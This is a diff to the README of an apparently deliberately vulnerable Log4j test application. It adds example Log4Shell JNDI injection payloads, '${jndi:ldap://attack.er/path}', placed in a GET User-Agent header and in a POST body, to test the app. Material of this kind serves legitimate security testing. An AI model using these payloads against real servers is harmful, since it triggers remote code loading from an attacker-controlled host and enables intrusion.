@@ -59,4 +59,13 @@ server.port = 8080
 ```
 
 In order to test for log4j vulnerabilities in this application, the payload must be inserted as follows:
-![ex_screenshot](./img/ITF-log4shell-vulnapp-Usage1.png)
+
+```bash
+/GET
+User-Agent: ${jndi:ldap://attack.er/path}
+
+/POST
+Content-Length: (length)
+
+payload=${jndi:ldap://attack.er/path}
+```
